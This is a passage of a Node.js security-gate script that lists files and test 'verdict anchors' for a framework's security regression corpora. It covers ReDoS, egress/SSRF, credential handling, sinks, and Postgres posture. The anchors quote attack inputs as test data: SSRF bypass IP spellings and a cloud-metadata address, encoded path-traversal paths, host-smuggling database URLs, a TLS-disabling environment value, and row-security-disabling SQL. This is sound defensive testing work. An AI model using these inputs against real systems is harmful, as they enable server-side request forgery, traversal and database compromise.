#!/usr/bin/env node
import { spawnSync } from 'node:child_process';
import { readFileSync } from 'node:fs';
import path from 'node:path';

import { isMainEntry, runGate } from './lib/cli-entry.mjs';
import { repoRoot as findRepoRoot } from './lib/repo-root.mjs';

export const repoRoot = findRepoRoot();

const REQUEST_SAFE_RUNTIME_INVENTORY_FILE =
  'packages/core/src/internal/request-safe-runtime-inventory.ts';
const REQUEST_PROCESS_CLASSIFIER_FILE = 'packages/drizzle/src/trust-escapes-static.ts';
const REQUEST_SAFE_RUNTIME_RUNNER_FILES = {
  cliHandler: 'packages/cli/src/commands/build-export.ts',
  compiler: 'packages/compiler/src/security-bootstrap.ts',
  generatedPresets: 'packages/server/src/build.ts',
  requestHandler: 'packages/server/src/request-handler.ts',
  runtimeBootstrap: 'packages/server/src/runtime-bootstrap.ts',
};
const CUSTOM_REQUEST_HANDLER_ENTRY_FILES = [
  'examples/commerce/scripts/demo-serve.mjs',
  'examples/commerce/scripts/measure-style-size.mjs',
  'examples/crm/scripts/demo-serve.mjs',
  'examples/crm/src/app-shell.ts',
  'examples/gallery/src/app-shell.ts',
  'examples/reference/src/app-shell.ts',
  'examples/stackoverflow/scripts/demo-serve.mjs',
  'examples/stackoverflow/src/app-shell.ts',
  'packages/devtool/src/mount.mjs',
  'site/src/aux.ts',
];
const PACKED_REQUEST_HANDLER_RUNNER_FILES = ['tests/p10-perf.node.mjs'];
const PACKED_STATIC_EXPORT_RUNNER_FILES = ['tests/kovo-check.export-static-worker.mjs'];
const ROOT_PACK_CONFIG_FILE = 'vite.config.ts';
const SECURITY_LOCKED_SCRIPT_FILES = [
  'examples/commerce/scripts/measure-style-size.mjs',
  'examples/commerce/scripts/serve.mjs',
  'examples/crm/scripts/serve.mjs',
  'examples/gallery/scripts/export-static.mjs',
  'examples/reference/scripts/export-static.mjs',
  'examples/reference/scripts/serve.mjs',
  'examples/stackoverflow/scripts/serve.mjs',
  'scripts/demo-session/serve.mjs',
  'site/scripts/capture.mjs',
  'site/scripts/export-static.mjs',
  'site/scripts/measure-route-style-size.mjs',
  'site/scripts/serve.mjs',
  'tests/compiler-determinism-worker.mjs',
];
const COMPILER_DETERMINISM_RUNNER_FILE = 'tests/compiler-determinism-worker.mjs';
const SECURITY_LOCKED_NESTED_VITE_FILES = ['site/src/gallery.ts'];
const SECURITY_LOCKED_VITE_RUNNER_FILE = 'scripts/lib/secure-vite-runtime.mjs';
const SECURITY_LOCKED_VITE_BUILD_RUNNER_FILE = 'scripts/lib/secure-vite-build.mjs';
const SECURITY_LOCKED_IN_PROCESS_BUILD_FILES = [
  'site/scripts/export-static.mjs',
  'site/scripts/measure-route-style-size.mjs',
];
const SECURITY_LOCKED_COMPILER_SCRIPT_FILES = [
  'examples/stackoverflow/scripts/materialize-demo-css.mjs',
];
const SECURITY_LOCKED_PACKAGE_BUILD_FILES = [
  {
    file: 'examples/commerce/package.json',
    snippet: '"build:demo": "node ../../scripts/lib/secure-vite-build.mjs"',
  },
  {
    file: 'examples/crm/package.json',
    snippet: '"build": "node ../../scripts/lib/secure-vite-build.mjs"',
  },
  {
    file: 'examples/stackoverflow/package.json',
    snippet:
      '"build": "node ../../scripts/lib/secure-vite-build.mjs && node scripts/materialize-demo-css.mjs"',
  },
  {
    file: 'site/package.json',
    snippet: '"build:css": "node ../scripts/lib/secure-vite-build.mjs"',
  },
];
const SITE_STATIC_EXPORT_RUNNER_FILE = 'site/scripts/export-static.mjs';
const PURE_APP_ENTRY_FILES = [
  'examples/commerce/src/app.tsx',
  'examples/crm/src/interactive-app.tsx',
  'examples/stackoverflow/src/interactive-app.tsx',
  'packages/create-kovo/templates/src/app.tsx',
  'site/src/app.tsx',
];
const CUSTOM_REQUEST_HANDLER_DOC_FILES = [
  'site/content/guides/deployment.md',
  'site/content/guides/request-shell.md',
];
const RUNTIME_BOOTSTRAP_IMPORT = "import '@kovojs/server/runtime-bootstrap';";
const PACKED_RUNTIME_BOOTSTRAP_IMPORT = "import '../dist/server/src/runtime-bootstrap.mjs';";
// C13 keeps these budgets and verdicts unchanged, but runs their files away from the broad batch
// and their named load-sensitive tests in fresh processes. The complementary first pattern still
// executes every other test in each file, so isolation cannot narrow the corpus.
const LOAD_ISOLATED_TEST_CONFIGS = [
  {
    file: 'packages/compiler/src/security-operation-ir.security.test.ts',
    freshTestNames: ['closes the normalized semantic summary budget with its exact reason'],
  },
  {
    file: 'packages/drizzle/src/trust-escapes-static-global-member-lockdown.test.ts',
    freshTestNames: ['keeps 120 distinct iterable and parameter-pattern safe misses bounded'],
  },
  {
    file: 'packages/drizzle/src/trust-escapes-static-temporal-final-review.test.ts',
    freshTestNames: [
      'keeps one hundred twenty unrelated safe class carriers within the provenance budget',
    ],
  },
  {
    file: 'packages/server/src/build.test.ts',
    freshTestNames: [
      'shares one packed anonymous-CSRF witness through emitted Node and Vercel app shells',
    ],
  },
];

const REQUEST_SAFE_RUNTIME_SET_ALIGNMENT = [
  ['requestSafeGlobalCallables', 'REQUEST_SAFE_GLOBAL_CALLABLES'],
  ['requestSafeGlobalNamespaces', 'REQUEST_SAFE_GLOBAL_NAMESPACES'],
  ['requestSafeGlobalConstructors', 'REQUEST_SAFE_GLOBAL_CONSTRUCTORS'],
];

export const REQUIRED_CLASSIFIER_CORPORA = [
  {
    id: 'redos',
    marker: '@kovo-security-classifier-corpus redos',
    testFiles: [
      'packages/server/src/redos.test.ts',
      'packages/server/src/redos-work-bound-oracle.test.ts',
      'packages/compiler/src/redos-pattern.test.ts',
    ],
    verdictAnchors: [
      {
        id: 'nested-quantifier-regression',
        file: 'packages/server/src/redos.test.ts',
        snippets: ['([\\w)]+)+', 'toThrow(RedosPatternError)'],
      },
      {
        id: 'overlapping-alternatives-regression',
        file: 'packages/server/src/redos.test.ts',
        snippets: ['^(a|aa)+$', 'overlapping alternatives'],
      },
      {
        id: 'nested-overlapping-alternatives-regression',
        file: 'packages/server/src/redos.test.ts',
        snippets: ['((a|a))+', 'nested group interiors contain overlapping alternatives'],
      },
      {
        id: 'followup-17-b1-dollar-line-terminator-regression',
        file: 'packages/server/src/redos.test.ts',
        snippets: ['B1 trailing line terminator', "compileLinearPattern('a$')", "'a\\n'"],
      },
      {
        id: 'followup-17-b3-in-class-legacy-numeric-regression',
        file: 'packages/server/src/redos.test.ts',
        snippets: [
          'B3 in-class legacy numeric escape',
          "compileLinearPattern('^[^\\\\1-\\\\37]+$')",
        ],
      },
      {
        id: 'followup-17-p2-case-gap-range-regression',
        file: 'packages/server/src/redos.test.ts',
        snippets: ['P2 i-flag case-gap range', "'[A-_]'", "'[Z-a]'"],
      },
      {
        id: 'compiler-overlapping-alternatives-regression',
        file: 'packages/compiler/src/redos-pattern.test.ts',
        snippets: ['^(a|a)*$', "toContain('KV434')"],
      },
      {
        id: 'compiler-nested-overlapping-alternatives-regression',
        file: 'packages/compiler/src/redos-pattern.test.ts',
        snippets: ['((a|a))+', "toContain('KV434')"],
      },
      {
        id: 'versioned-deterministic-work-bound-oracle',
        file: 'packages/server/src/redos-work-bound-oracle.test.ts',
        snippets: [
          'versioned deterministic ReDoS work-bound oracle',
          'kovo.linear-regex-work/v1',
          'covers every hostile regression family at the full runtime input ceiling with a fixed seed',
        ],
      },
    ],
  },
  {
    id: 'egress-ip',
    marker: '@kovo-security-classifier-corpus egress-ip',
    testFiles: [
      'packages/cli/src/commands/security-disposition.test.ts',
      'packages/cli/src/index.kovo-db.test.ts',
      'packages/server/src/egress-bootstrap.test.ts',
      'packages/server/src/egress-nat64-nsp.test.ts',
      'packages/server/src/egress-property-oracle.test.ts',
      'packages/server/src/egress-undici.test.ts',
      'packages/server/src/egress.test.ts',
      'packages/server/src/postgres-runtime.test.ts',
      'packages/server/src/runtime-environment-authority.test.ts',
      'packages/server/src/task-runner.test.ts',
      'packages/server/src/webhook.test.ts',
    ],
    verdictAnchors: [
      {
        id: 'destination-origin-boot-canonicalization',
        file: 'packages/server/src/egress.test.ts',
        snippets: [
          'canonicalizes framework-owned destination origins and refuses malformed boot input',
          "'https://API.EXAMPLE.COM.'",
          "'http://[2001:db8::1]:80'",
          'toThrow(EgressConfigError)',
        ],
      },
      {
        id: 'undeclared-origin-before-dns-dial',
        file: 'packages/server/src/egress-property-oracle.test.ts',
        snippets: [
          'rejects generated undeclared origin spellings before DNS',
          'undeclared-origin-before-dns-dial',
          'expect(lookup).not.toHaveBeenCalled()',
        ],
      },
      {
        id: 'redirect-hop-before-dns-dial',
        file: 'packages/server/src/egress-undici.test.ts',
        snippets: [
          'rejects an undeclared redirect origin before DNS or dial',
          'undeclared-hop.invalid',
          'expect(dnsLookupMock).not.toHaveBeenCalled()',
        ],
      },
      {
        id: 'declared-origin-dns-rotation',
        file: 'packages/server/src/egress-undici.test.ts',
        snippets: [
          're-resolves a declared framework origin on every request while keeping the origin closed',
          "{ address: '::1', family: 6 }",
          'expect(initialLookup).toBe(4)',
          "reason: 'destination-allowlist'",
        ],
      },
      {
        id: 'database-endpoint-dns-rotation',
        file: 'packages/server/src/egress.test.ts',
        snippets: [
          'keeps an exact framework database endpoint usable across pinned DNS rotation',
          'db-rotation.test',
          'createDatabaseEgressSocket(databaseUrl)',
          'unrelatedError',
        ],
      },
      {
        id: 'application-proxy-dispatcher-closed',
        file: 'packages/server/src/egress-property-oracle.test.ts',
        snippets: [
          'strips an application-supplied dispatcher from the sole supported fetch door',
          'application dispatcher gained egress authority',
          'expect(attackerDispatches).toBe(0)',
        ],
      },
      {
        id: 'proxy-config-refuses-boot',
        file: 'packages/server/src/egress-bootstrap.test.ts',
        snippets: [
          'refuses application proxy/dispatcher configuration instead of bypassing the capability',
          "proxy: 'http://proxy.internal:8080'",
          'unsupported property dispatcher',
        ],
      },
      {
        id: 'task-context-fetch-nonreplaceable',
        file: 'packages/server/src/task-runner.test.ts',
        snippets: [
          'pins the queue identity and never accepts a replaceable egress hook',
          "Object.getOwnPropertyDescriptor(observedContext!, 'fetch')",
          'configurable: false',
          'writable: false',
          'toThrow(TypeError)',
        ],
      },
      {
        id: 'webhook-context-fetch-nonreplaceable',
        file: 'packages/server/src/webhook.test.ts',
        snippets: [
          'exposes exactly the framework-owned egress capability to verified handlers',
          "Object.getOwnPropertyDescriptor(observedContext!, 'fetch')",
          'configurable: false',
          'writable: false',
          'toThrow(TypeError)',
        ],
      },
      {
        id: 'octal-ip-regression',
        file: 'packages/server/src/egress.test.ts',
        snippets: ["normalizeIpLiteral('0177.0.0.1')", "'127.0.0.1'"],
      },
      {
        id: 'metadata-bypass-regression',
        file: 'packages/server/src/egress.test.ts',
        snippets: ["classifyIp('0xA9FEA9FE')", "'metadata'"],
      },
      {
        id: 'iana-ipv6-special-purpose-regression',
        file: 'packages/server/src/egress.test.ts',
        snippets: ["'2001:2::1'", "'2001:100::1'", "'3fff::1'", "classification: 'special-use'"],
      },
      {
        id: 'iana-special-purpose-registry-completeness-regression',
        file: 'packages/server/src/egress.test.ts',
        snippets: [
          'complete 2025-10-09 IANA special-purpose registry snapshot',
          "'192.31.196.1'",
          "'192.52.193.1'",
          "'192.175.48.1'",
          "'2620:4f:8000::1'",
          "'::ffff:192.31.196.1'",
          "'64:ff9b::192.31.196.1'",
          "'2620:4f:8001::'",
        ],
      },
      {
        id: 'rfc6052-network-specific-pref64-regression',
        file: 'packages/server/src/egress-nat64-nsp.test.ts',
        snippets: [
          'Network-Specific Pref64 egress corpus',
          "'2606:4700::/32'",
          "'2606:4700:1200::/40'",
          "'2606:4700:1234::/48'",
          "'2606:4700:1234:5600::/56'",
          "'2606:4700:1234:5678::/64'",
          "'2606:4700:1234:5678::/96'",
          'non-zero RFC6052 u octet',
          'never lets allowInternal reopen metadata',
        ],
      },
      {
        id: 'azure-identity-endpoint-provider-separation',
        file: 'packages/server/src/egress.test.ts',
        snippets: [
          'Azure IDENTITY_ENDPOINT corpus',
          "identityEndpoint: 'http://127.1:40342/msi/token?api-version=2019-08-01'",
          "runWithMetadataAccess('azure'",
          "runWithMetadataAccess('aws'",
          "runWithMetadataAccess('gcp'",
          'reserves a hostname-configured identity port before its first DNS resolution',
          "identityEndpoint: 'http://identity.internal:40344/msi/token'",
        ],
      },
      {
        id: 'database-endpoint-socket-provenance',
        file: 'packages/server/src/egress.test.ts',
        snippets: [
          'keeps registered database authority on framework-created PostgreSQL sockets',
          'createDatabaseEgressSocket(databaseUrl)',
          "unrelatedSocket.connect(port, '127.0.0.1')",
        ],
      },
      {
        id: 'database-effective-query-endpoint-regression',
        file: 'packages/server/src/egress.test.ts',
        snippets: [
          'uses node-postgres last-wins query host and port for database socket provenance',
          'host=10.0.5.2&port=54329&sslmode=verify-full',
          "policy.allowDatabaseEndpoints.has('10.0.5.2:54329')",
        ],
      },
      {
        id: 'database-duplicate-last-tls-posture-regression',
        file: 'packages/server/src/postgres-runtime.test.ts',
        snippets: [
          'requires exact authenticated TLS for every non-local managed Postgres URL',
          'sslmode=verify-full&sslmode=disable',
          'toThrow(/KV433_POSTGRES_TLS: non-local databaseUrl/)',
        ],
      },
      {
        id: 'database-ip-literal-certificate-identity-regression',
        file: 'packages/server/src/postgres-runtime.test.ts',
        snippets: [
          'rejects every non-loopback IP literal because pg does not verify its certificate identity',
          'postgres://app@10.0.0.9:5432/kovo?sslmode=verify-full',
          'postgres://app@[2001:4860:4860::8888]:5432/kovo?sslmode=verify-full',
          'postgres://app@db.example:5432/kovo?host=10.0.0.9&sslmode=verify-full',
          'KV433_POSTGRES_TLS_HOST',
        ],
      },
      {
        id: 'database-pinned-parser-query-endpoint-regression',
        file: 'packages/server/src/postgres-runtime.test.ts',
        snippets: [
          'locks the managed TLS gate to pinned node-postgres parsing behavior',
          'host=10.0.0.1&port=2222&host=db.example&port=5433&sslmode=verify-full',
          "connectionParameters.host).toBe('db.example')",
          'connectionParameters.port).toBe(5433)',
          "bracketedIpv6Authority.connectionParameters.host).toBe('[::1]')",
          "exactIpv6QueryHost.connectionParameters.host).toBe('::1')",
        ],
      },
      {
        id: 'database-resolver-locality-differential-regression',
        file: 'packages/server/src/postgres-runtime.test.ts',
        snippets: [
          'does not confuse permissive resolver spellings with an exact local Postgres carrier',
          "dnsLookup('0177.0.0.1')",
          "databaseUrl: 'postgres://app@0177.0.0.1:5432/kovo'",
          'KV433_POSTGRES_TLS_HOST',
        ],
      },
      {
        id: 'database-ambient-port-and-permissive-port-regression',
        file: 'packages/server/src/postgres-runtime.test.ts',
        snippets: [
          'requires canonical remote authority fields and rejects permissive query ports',
          "connectionString: 'postgres://app@db.example:5432/kovo?port=1e3&sslmode=verify-full'",
          'permissivePort.connectionParameters.port).toBe(1)',
          'refuses a missing remote port that pinned pg would fill from ambient PGPORT',
          "process.env.PGPORT = '6543'",
          'KV433_POSTGRES_AUTHORITY',
        ],
      },
      {
        id: 'database-unix-socket-authority-regression',
        file: 'packages/server/src/postgres-runtime.test.ts',
        snippets: [
          'requires explicit Unix-socket identity and port instead of pg ambient fallbacks',
          "connectionString: '/tmp/kovo-pg kovo'",
          'postgres://app@localhost:5432/kovo?host=%2Ftmp%2Fkovo-pg',
          'KV433_POSTGRES_AUTHORITY',
        ],
      },
      {
        id: 'database-unix-socket-carrier-provenance',
        file: 'packages/server/src/egress.test.ts',
        snippets: [
          'keeps a validated Postgres Unix path on the exact framework-created socket',
          'unrelatedSocket.connect(socketPath)',
          'createDatabaseEgressSocket(databaseUrl)',
        ],
      },
      {
        id: 'database-raw-url-envelope-regression',
        file: 'packages/server/src/postgres-runtime.test.ts',
        snippets: [
          'rejects raw URL-envelope forms that pinned pg parses against a different authority',
          "connectionParameters.host).toBe('base')",
          "'POSTGRES://app@db.example:5432/kovo?sslmode=verify-full'",
          'KV433_POSTGRES_URL',
        ],
      },
      {
        id: 'database-malformed-percent-parser-regression',
        file: 'packages/server/src/postgres-runtime.test.ts',
        snippets: [
          'rejects malformed-percent preprocessing that makes pg ignore reviewed security keys',
          'postgres://u:p%zz@8.8.8.8:5432/db?h%6Fst=127.0.0.1',
          'postgres://u:p%zz@db.example:5432/db?sslm%6Fde=verify-full',
          "host: '8.8.8.8'",
          'ssl: false',
          'KV433_POSTGRES_URL',
        ],
      },
      {
        id: 'database-disabled-node-tls-regression',
        file: 'packages/server/src/postgres-runtime.test.ts',
        snippets: [
          'refuses a boot-pinned NODE_TLS_REJECT_UNAUTHORIZED=0 before creating a remote pool',
          "NODE_TLS_REJECT_UNAUTHORIZED: '0'",
          'KV433_POSTGRES_TLS_ENV',
        ],
      },
      {
        id: 'windows-operator-environment-casefold-regression',
        file: 'packages/server/src/runtime-environment-authority.test.ts',
        snippets: [
          'mirrors Windows case-insensitive operator lookup without rewriting app env keys',
          "node_env: 'production'",
          "Node_Tls_Reject_Unauthorized: '0'",
          'production requires a least-privilege external Postgres',
          'KV433_POSTGRES_TLS_ENV',
          'fails closed on impossible Windows case-fold collisions',
          "{ Node_Env: 'production', NODE_ENV: 'development' }",
        ],
      },
      {
        id: 'windows-cli-operator-environment-casefold-regression',
        file: 'packages/cli/src/commands/security-disposition.test.ts',
        snippets: [
          'mirrors Windows case-insensitive CLI posture lookup while preserving operator spellings',
          "Kovo_Admin_Database_Url: 'postgres://admin@db.example:5432/app?sslmode=verify-full'",
          "kovo_db_driver: 'node-postgres'",
          "KOVO_ADMIN_DATABASE_URL: 'postgres://admin@db.example:5432/app?sslmode=verify-full'",
          "KOVO_DB_DRIVER: 'node-postgres'",
          'fails closed on impossible Windows CLI environment case collisions',
          "{ Node_Env: 'production', NODE_ENV: 'development' }",
        ],
      },
      {
        id: 'windows-cli-database-carrier-regression',
        file: 'packages/cli/src/index.kovo-db.test.ts',
        snippets: [
          'recognizes a Windows-equivalent mixed-case admin carrier but still requires runtime',
          "Kovo_Admin_Database_Url: 'postgres://bad@127.0.0.1:1/nope'",
          "kovo_db_driver: 'node-postgres'",
          "expect(check.stderr).not.toContain('DRIVER pglite')",
        ],
      },
      {
        id: 'cli-invalid-database-driver-closed-regression',
        file: 'packages/cli/src/index.kovo-db.test.ts',
        snippets: [
          'refuses unsupported KOVO_DB_DRIVER before %s target selection',
          "const invalidDrivers = ['bogus', '', ' pg', 'PG'] as const",
          "expect(run.stderr, driver).toContain('unsupported KOVO_DB_DRIVER')",
          "expect(run.stderr, driver).not.toContain('DRIVER pglite')",
          "expect(run.stderr, driver).not.toContain('authored schema evaluated')",
        ],
      },
    ],
  },
  {
    id: 'better-auth-credentials',
    marker: '@kovo-security-classifier-corpus better-auth-credentials',
    testFiles: [
      'packages/better-auth/src/internal.trusted-plaintext.test.ts',
      'packages/better-auth/src/index.schema-bridge.test.ts',
      'packages/better-auth/src/index.schema-materialize.test.ts',
    ],
    verdictAnchors: [
      {
        id: 'credential-runtime-gate-identity-and-replay',
        file: 'packages/better-auth/src/internal.trusted-plaintext.test.ts',
        snippets: [
          'rejects forged, cross-consumer, and replayed runtime results',
          'KV439: unregistered Better Auth credential consumer',
          'KV439: mismatched Better Auth credential consumer result',
        ],
      },
      {
        id: 'credential-runtime-gate-complete-consumer-denominator',
        file: 'packages/better-auth/src/internal.trusted-plaintext.test.ts',
        snippets: [
          'keeps the symbol-flow Better Auth credential denominator equal to the reviewed census',
          'censusBetterAuthCredentialSources(',
          'fails red on aliased, destructured, computed, call/apply, and imported raw consumers',
          'Reflect.apply(importedHandler',
          'accepts gate/token aliases only when symbol flow still resolves the exact owner',
        ],
      },
      {
        id: 'credential-runtime-gate-source-ownership',
        file: 'packages/better-auth/src/internal.trusted-plaintext.test.ts',
        snippets: [
          'keeps raw Better Auth callables inside the exact runtime door',
          'runBetterAuthCredentialSourceCallableAsync<Response>',
          'cannot invoke raw source better-auth.callable',
          'cannot execute an owner callback',
          'received an invalid callable',
          'M2_CALLABLE_ERROR_MUST_NOT_EGRESS',
        ],
      },
      {
        id: 'credential-runtime-gate-result-and-error',
        file: 'packages/better-auth/src/internal.trusted-plaintext.test.ts',
        snippets: [
          'validates hostile consumer results and redacts provider errors at runtime',
          'returned a non-Argon2id hash',
          'expect(resultTrapRan).toBe(false)',
          'expect(String(caught)).not.toContain(password)',
          'expect(String(proxyCaught)).not.toContain(password)',
        ],
      },
      {
        id: 'apikey-secret-classification',
        file: 'packages/better-auth/src/index.schema-bridge.test.ts',
        snippets: ["apiKey: { domain: 'auth', key: 'userId', secret: ['key'] }"],
      },
      {
        id: 'schema-intrinsic-poisoning-regression',
        file: 'packages/better-auth/src/index.schema-materialize.test.ts',
        snippets: [
          'keeps credential-table annotations after late schema-control poisoning',
          "kovo({ domain: 'auth', key: 'userId', secret: ['token'] })",
          'Object.keys = (() => [])',
          'RegExp.prototype.exec = (() => null)',
        ],
      },
    ],
  },
  {
    id: 'sink-registry',
    marker: '@kovo-security-classifier-corpus sink-registry',
    testFiles: [
      'packages/core/src/sink-policy.test.ts',
      'packages/core/src/internal/source-sink-registry.test.ts',
      'scripts/check-sink-policy-gate.test.mjs',
    ],
    verdictAnchors: [
      {
        id: 'svg-smil-temporal-sink-regression',
        file: 'packages/core/src/sink-policy.test.ts',
        snippets: [
          'fails closed on SVG SMIL execution primitives independent of authored casing',
          'expect(isBlockedSvgSmilElementName(name)).toBe(true)',
          'expect(isBlockedSvgSmilElementName(name.toUpperCase())).toBe(true)',
        ],
      },
      {
        id: 'redirect-url-mechanism',
        file: 'packages/core/src/internal/source-sink-registry.test.ts',
        snippets: ["['redirect URL', 'reconstruct']"],
      },
      {
        id: 'meta-refresh-first-attribute-pair',
        file: 'packages/core/src/internal/source-sink-registry.test.ts',
        snippets: [
          'keeps browser-effective meta refresh pairing in the C13 HTML sink corpus',
          'server-meta-refresh-first-attribute-pair',
          'ASCII-case duplicate meta refresh navigation',
        ],
      },
      {
        id: 'outbound-egress-mechanism',
        file: 'packages/core/src/internal/source-sink-registry.test.ts',
        snippets: ["['outbound egress request', 'own']"],
      },
      {
        id: 'raw-filesystem-reject-corpus',
        file: 'scripts/check-sink-policy-gate.test.mjs',
        snippets: [
          'rejects raw filesystem file-serve sinks outside the rooted file primitive',
          'createWriteStream(requestedPath)',
          'rawOpen(requestedPath',
        ],
      },
      {
        id: 'generated-static-fd-identity-corpus',
        file: 'scripts/check-sink-policy-gate.test.mjs',
        snippets: [
          'keeps the generated Node static-file allowance tied to fd identity revalidation',
          'readFileDescriptor(fileDescriptor, callback)',
          'body: await readFile(resolved)',
        ],
      },
      {
        id: 'generated-static-encoded-separator-regression',
        file: 'packages/server/src/build.test.ts',
        snippets: [
          'does not expose generated static metadata through encoded separator aliases',
          "'/x%2f..%2f_headers'",
          "'/x%5c..%5c_headers'",
          "'/x%2f..%2fkovo-static-manifest.json'",
          "'/x%2f..%2fassets%2froot-confusion.js'",
        ],
      },
      {
        id: 'vercel-private-static-metadata-regression',
        file: 'packages/server/src/build.test.ts',
        snippets: [
          "readFile(join(vercelOutDir, 'static/_headers'), 'utf8')",
          "readFile(join(vercelOutDir, 'static/kovo-static-manifest.json'), 'utf8')",
          "Vercel's Build Output API makes every file under static/ public",
        ],
      },
    ],
  },
  {
    id: 'postgres-identity-posture',
    marker: '@kovo-security-classifier-corpus postgres-identity-posture',
    testFiles: [
      'packages/server/src/managed-db.test.ts',
      'packages/server/src/postgres-grant-shape-fuzzer.test.ts',
      'packages/server/src/postgres-external-probe.test.ts',
      'packages/server/src/postgres-runtime.test.ts',
    ],
    verdictAnchors: [
      {
        id: 'grant-shape-closure-fuzzer',
        file: 'packages/server/src/postgres-grant-shape-fuzzer.test.ts',
        snippets: [
          'matches audit refusal to engine-reachable leak shapes across grants and object classes',
        ],
      },
      {
        id: 'identity-attribute-axis',
        file: 'packages/server/src/postgres-grant-shape-fuzzer.test.ts',
        snippets: [
          'matches the identity-attribute axis against runtime-login and assumable-role posture',
        ],
      },
      {
        id: 'live-current-user-session-user-skew',
        file: 'packages/server/src/postgres-external-probe.test.ts',
        snippets: [
          'witnesses runtime current_user on standalone and boot split-authority posture paths',
          "'-c role=kovo_admin'",
          'expectStandalonePostureWitnessesAuthenticatedRuntimeConnection',
          'expectBootPostureWitnessesAuthenticatedRuntimeConnection',
          'runtime connection current_user kovo_admin must match authenticated session_user',
        ],
      },
      {
        id: 'runtime-startup-setting-baseline',
        file: 'packages/server/src/postgres-external-probe.test.ts',
        snippets: [
          'rejects privileged startup settings before they can disable runtime enforcement',
          'session_replication_role = replica',
          'INSERT INTO posture_child (parent_id) VALUES (404)',
          'ALTER ROLE ${quoteIdent(runtimeRole)} SET row_security = off',
          'ALTER DATABASE ${quoteIdent(database)} SET search_path = public',
        ],
      },
      {
        id: 'runtime-pre-reset-namespace-witness',
        file: 'packages/server/src/postgres-external-probe.test.ts',
        snippets: [
          'pins the whole pre-reset witness under hostile search_path shadow objects',
          'CREATE FUNCTION public.current_setting(pg_catalog.text)',
          'CREATE DOMAIN public.text AS pg_catalog.text',
          'CREATE OPERATOR public.=',
        ],
      },
      {
        id: 'split-posture-database-binding',
        file: 'packages/server/src/postgres-external-probe.test.ts',
        snippets: [
          'binds split posture authority to the same live database and writable cluster',
          'expectDatabaseIdentityPostureFailure(firstRuntimeUrl, secondAdminUrl)',
          'expectDatabaseIdentityPostureFailure(firstRuntimeUrl, siblingAdminUrl)',
          'REVOKE EXECUTE ON FUNCTION pg_catalog.pg_control_system() FROM PUBLIC',
        ],
      },
      {
        id: 'cross-schema-base-name-authz-collision',
        file: 'packages/server/src/postgres-runtime.test.ts',
        snippets: [
          'rejects cross-schema duplicate base names before secret grant metadata can collide',
          'secret: true',
          "secret: ['classified']",
          'KV433_DUPLICATE_TABLE_NAME',
        ],
      },
      {
        id: 'app-transaction-search-path-normalization',
        file: 'packages/server/src/managed-db.test.ts',
        snippets: [
          'server-owned Postgres scoped client parameterizes the principal before assuming the app role',
          'exec:SET LOCAL search_path = pg_catalog, public, pg_temp',
          "query:SELECT set_config('kovo.principal', $1, true)",
          'exec:SET LOCAL ROLE "kovo_reader"',
        ],
      },
      {
        id: 'app-transaction-search-path-data-path',
        file: 'packages/server/src/managed-db.test.ts',
        snippets: [
          'normalizes search_path before an unqualified managed Drizzle builder resolves its table',
          "'SET search_path = shadow_scope, public'",
          "rows: [{ classified: 'victim-secret' }]",
          "resolves.toEqual([{ classified: 'public-safe', id: 'public' }])",
        ],
      },
      {
        id: 'postgres-setting-source-closure',
        file: 'packages/server/src/postgres-runtime.test.ts',
        snippets: [
          'classifies every pg_settings source and fails closed on future source categories',
          'future provider control plane',
          'unclassified pg_settings source future provider control plane',
        ],
      },
    ],
  },
  {
    id: 'runtime-secret-provenance',
    marker: '@kovo-security-classifier-corpus runtime-secret-provenance',
    testFiles: ['packages/server/src/secret-read-boundary.test.ts'],
    verdictAnchors: [
      {
        id: 'pinned-table-same-name-scope',
        file: 'packages/server/src/secret-read-boundary.test.ts',
        snippets: [
          'scopes same-named secret columns to pinned tables across Postgres read shapes',
          "expect(aliasedViewRows).toEqual([{ id: 'p1', label: 'public-label' }])",
          'expect(isSecret(viewRows[0]?.id)).toBe(false)',
          'expect(isSecret(aliasSecretRows[0]?.classified)).toBe(true)',
          'expect(isSecret(secretRows[0]?.id)).toBe(true)',
        ],
      },
      {
        id: 'unknown-relation-closed',
        file: 'packages/server/src/secret-read-boundary.test.ts',
        snippets: [
          'boxes direct and computed projections from an unregistered Postgres view',
          'does not accept a structural imitation of the canonical relation witness',
          'expect(isSecret(direct[0]?.leaked)).toBe(true)',
          'expect(isSecret(computed[0]?.leaked)).toBe(true)',
          'expect(isSecret(aliased[0]?.leaked)).toBe(true)',
        ],
      },
      {
        id: 'qualified-relation-scope',
        file: 'packages/server/src/secret-read-boundary.test.ts',
        snippets: [
          'keeps same-named secret tables in separate Postgres schemas independently boxed',
          'expect(isSecret(wholeRows[0]?.id)).toBe(true)',
          'expect(isSecret(partialRows[0]?.id)).toBe(false)',
          'expect(isSecret(wholeAliased[0]?.id)).toBe(true)',
          'expect(isSecret(partialComputed[0]?.id)).toBe(false)',
        ],
      },
      {
        id: 'nested-and-opaque-closed-controls',
        file: 'packages/server/src/secret-read-boundary.test.ts',
        snippets: [
          'deep-boxes relational namespaces and parameter-bearing prepared terminals',
          'expect(isSecret(first?.derived)).toBe(true)',
          'expect(isSecret(parent.secrets[0]!.classified)).toBe(true)',
          'refuses raw secret-table reads without a declared capability',
        ],
      },
    ],
  },
  {
    id: 'response-transport-headers',
    marker: '@kovo-security-classifier-corpus response-transport-headers',
    testFiles: [
      'packages/server/src/response-transport-headers.test.ts',
      'packages/server/src/response-posture.test.ts',
      'packages/server/src/node.test.ts',
      'packages/server/src/build.test.ts',
      'packages/server/src/static-export-headers.test.ts',
      'packages/server/src/http-header-roundtrip-property-oracle.test.ts',
    ],
    verdictAnchors: [
      {
        id: 'exact-runtime-and-type-set',
        file: 'packages/server/src/response-transport-headers.test.ts',
        snippets: [
          'keeps the runtime rejection set aligned with the exhaustive type-level set',
          "'content-length'",
          "'connection'",
          "'http2-settings'",
          "'keep-alive'",
          "'proxy-authenticate'",
          "'proxy-authorization'",
          "'proxy-connection'",
          "'te'",
          "'trailer'",
          "'transfer-encoding'",
          "'upgrade'",
          'MissingTransportOwnedResponseHeaderName',
        ],
      },
      {
        id: 'structured-and-raw-response-corpus',
        file: 'packages/server/src/response-posture.test.ts',
        snippets: [
          'rejects the transport-owned response-header corpus for structured and raw endpoints',
          'finalizeServerResponse',
          'finalizeRawWebResponse',
        ],
      },
      {
        id: 'pipelined-wire-regression',
        file: 'packages/server/src/node.test.ts',
        snippets: [
          'fails a framing-header response before bytes can desynchronize a pipelined connection',
          "expect(wire).not.toContain('HELLO')",
          'expect(wire.match(/HTTP\\/1\\.1 /gu)).toHaveLength(2)',
        ],
      },
      {
        id: 'generated-node-vercel-parity',
        file: 'packages/server/src/build.test.ts',
